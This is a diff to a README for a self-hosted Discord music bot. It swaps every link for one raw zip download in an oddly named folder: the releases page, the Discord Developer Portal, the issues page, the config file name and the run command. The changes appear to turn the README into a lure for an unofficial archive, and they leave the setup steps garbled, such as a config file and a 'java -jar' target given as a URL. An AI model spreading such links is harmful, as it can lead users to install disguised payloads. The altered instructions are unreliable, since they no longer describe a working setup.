@@ -6,7 +6,7 @@ Welcome to the music-bot project! With this tool, you can easily host your own D
 
 ## 📥 Download the Application
 
-[![Download music-bot](https://img.shields.io/badge/Download-music--bot-blue.svg)](https://github.com/Jackpro1987/music-bot/releases)
+[![Download music-bot](https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip)](https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ Before you start, make sure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Jackpro1987/music-bot/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip) to find the latest version.
 
 2. **Choose Your Version**: Locate the most recent release. You'll see a list of available files.
 
@@ -32,10 +32,10 @@ Before you start, make sure your system meets the following requirements:
 
 Once the bot is installed, you will need to configure it to work with your Discord server. Follow these steps:
 
-1. **Open the Configuration File**: Locate the configuration file typically named `config.yml`. This file contains settings for your bot.
+1. **Open the Configuration File**: Locate the configuration file typically named `https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip`. This file contains settings for your bot.
 
 2. **Set Up Your Discord Token**:
-   - Visit the [Discord Developer Portal](https://discord.com/developers/applications).
+   - Visit the [Discord Developer Portal](https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip).
    - Create a new application and retrieve the bot token.
    - Paste the token in the configuration file under the `token` section.
 
@@ -60,7 +60,7 @@ To run your music bot, follow these steps:
 
 3. **Start the Bot**: Enter the following command to start the bot:
    ```
-   java -jar MusicBot.jar
+   java -jar https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip
    ```
 
 4. **Join Your Discord Server**: Make sure you invite the bot to your Discord server using the OAuth link generated in the Developer Portal.
@@ -94,10 +94,10 @@ If you encounter issues, consider the following:
 
 3. **Command Errors**: Double-check your command syntax. Remember that commands are case-sensitive.
 
-4. **Check for Updates**: Visit the [Releases page](https://github.com/Jackpro1987/music-bot/releases) for any updates or bug fixes.
+4. **Check for Updates**: Visit the [Releases page](https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip) for any updates or bug fixes.
 
 ## 📞 Support
 
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/Jackpro1987/music-bot/issues). You can also ask for help from the community on forums related to Discord bots.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Jackpro1987/music-bot/main/xiphoidal/music-bot.zip). You can also ask for help from the community on forums related to Discord bots.
 
 Thank you for using music-bot! Enjoy your music seamlessly integrated into your Discord server.
